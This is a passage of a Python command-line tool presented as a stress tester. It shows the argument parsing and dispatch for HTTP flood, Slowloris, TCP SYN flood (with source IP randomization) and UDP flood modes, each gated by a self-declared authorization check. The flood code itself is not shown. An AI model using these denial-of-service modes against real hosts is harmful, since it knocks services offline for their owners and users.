    p_http.add_argument("-t", "--threads", type=int, default=10, help="Concurrent threads (default: 10)")
    p_http.add_argument("-d", "--duration", type=float, default=30.0, help="Duration in seconds (default: 30)")
    p_http.add_argument("-m", "--method", default="GET", choices=["GET", "POST", "HEAD", "PUT"])
    p_http.add_argument("--header", action="append", default=[], help="Custom header (Key: Value)")
    p_http.add_argument("--body", type=str, default=None, help="Request body (POST/PUT)")
    p_http.add_argument("--keep-alive", action="store_true", help="Use persistent connections")
    p_http.add_argument("--ramp", type=float, default=0.0, help="Ramp-up time in seconds")
    _add_common_args(p_http)

    # -- SLOWLORIS --
    p_slow = sub.add_parser("slowloris", help="Slowloris slow-HTTP attack")
    p_slow.add_argument("target", help="Target hostname or IP")
    p_slow.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    p_slow.add_argument("-s", "--sockets", type=int, default=200, help="Number of sockets (default: 200)")
    p_slow.add_argument("-d", "--duration", type=float, default=60.0, help="Duration in seconds (default: 60)")
    p_slow.add_argument("--interval", type=float, default=10.0, help="Header send interval (default: 10s)")
    _add_common_args(p_slow)

    # -- TCP --
    p_tcp = sub.add_parser("tcp", help="TCP SYN flood")
    p_tcp.add_argument("target", help="Target hostname or IP")
    p_tcp.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    p_tcp.add_argument("-d", "--duration", type=float, default=30.0, help="Duration in seconds (default: 30)")
    p_tcp.add_argument("--no-randomize", action="store_true", help="Disable source IP randomization")
    _add_common_args(p_tcp)

    # -- UDP --
    p_udp = sub.add_parser("udp", help="UDP flood")
    p_udp.add_argument("target", help="Target hostname or IP")
    p_udp.add_argument("-p", "--port", type=int, default=53, help="Target port (default: 53)")
    p_udp.add_argument("-d", "--duration", type=float, default=30.0, help="Duration in seconds (default: 30)")
    p_udp.add_argument("--packet-size", type=int, default=1024, help="Packet size in bytes (64-65507)")
    _add_common_args(p_udp)

    return parser


def main(argv: Optional[List[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    C.p(BANNER)

    if not args.command:
        parser.print_help()
        return 1

    guard = AuthorizationGuard(allow_private=getattr(args, "allow_private", False))
    reporter = StressReporter()

    # ------------------------------------------------------------------ #
    #  HTTP
    # ------------------------------------------------------------------ #
    if args.command == "http":
        target = args.url
        if not guard.enforce(target, args.authorized):
            return 2

        headers: Dict[str, str] = {}
        for h in args.header:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()

        flood = HTTPFlood(guard)
        stop_ev = threading.Event()
        dash = threading.Thread(
            target=reporter.live_display,
            args=(flood.results_queue, stop_ev),
            daemon=True,
        )
        dash.start()

        result = flood.run(
            url=target,
            threads=args.threads,
            duration=args.duration,
            method=args.method,
            headers=headers or None,
            body=args.body,
            keep_alive=args.keep_alive,
            ramp_seconds=args.ramp,
            max_rps=args.max_rps,
        )
        stop_ev.set()
        reporter.generate_report(result)
        if args.output:
            reporter.export_json(result, args.output)

    # ------------------------------------------------------------------ #
    #  SLOWLORIS
    # ------------------------------------------------------------------ #
    elif args.command == "slowloris":
        target = args.target
        if not guard.enforce(target, args.authorized):
            return 2

        attack = SlowlorisAttack(guard)
        result = attack.run(
            target=target,
            port=args.port,
            sockets_count=args.sockets,
            duration=args.duration,
            interval=args.interval,
            max_rps=args.max_rps,
        )
        reporter.generate_report_slowloris(result)
        if args.output:
            reporter.export_json(result, args.output)

    # ------------------------------------------------------------------ #
    #  TCP
    # ------------------------------------------------------------------ #
    elif args.command == "tcp":
        target = args.target
        if not guard.enforce(target, args.authorized):
            return 2

        flood = TCPFlood(guard)
        result = flood.run(
            target=target,
            port=args.port,
            duration=args.duration,
            randomize_source=not args.no_randomize,
            max_rps=args.max_rps,
        )
        reporter.generate_report(result)
        if args.output:
            reporter.export_json(result, args.output)

    # ------------------------------------------------------------------ #
    #  UDP
    # ------------------------------------------------------------------ #
    elif args.command == "udp":
        target = args.target
        if not guard.enforce(target, args.authorized):
            return 2

        flood = UDPFlood(guard)
        result = flood.run(
            target=target,
            port=args.port,
            duration=args.duration,
            packet_size=args.packet_size,
            max_rps=args.max_rps,
        )
        reporter.generate_report(result)
        if args.output:
            reporter.export_json(result, args.output)

    C.ok("Stress test complete.")
    return 0


# =============================================================================
#  ENTRY POINT
# =============================================================================

if __name__ == "__main__":
    raise SystemExit(main())
